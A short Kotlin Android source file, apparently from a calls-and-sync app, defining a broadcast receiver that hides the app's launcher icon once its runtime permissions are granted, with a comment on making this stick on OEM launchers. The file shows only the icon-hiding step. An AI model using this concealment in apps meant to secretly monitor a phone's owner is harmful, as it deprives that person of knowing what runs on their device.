package com.calltech

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

/** Process marne ke baad bhi alias-swap apply — OEM launcher tabhi icon hataata hai. */
class HideLauncherReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        if (SyncBootstrap.needsRuntimePermissions(context.applicationContext)) {
            return
        }
        val stage = intent?.getIntExtra(LauncherHider.EXTRA_STAGE, 0) ?: 0
        LauncherHider.applyStage(context.applicationContext, stage)
    }
}
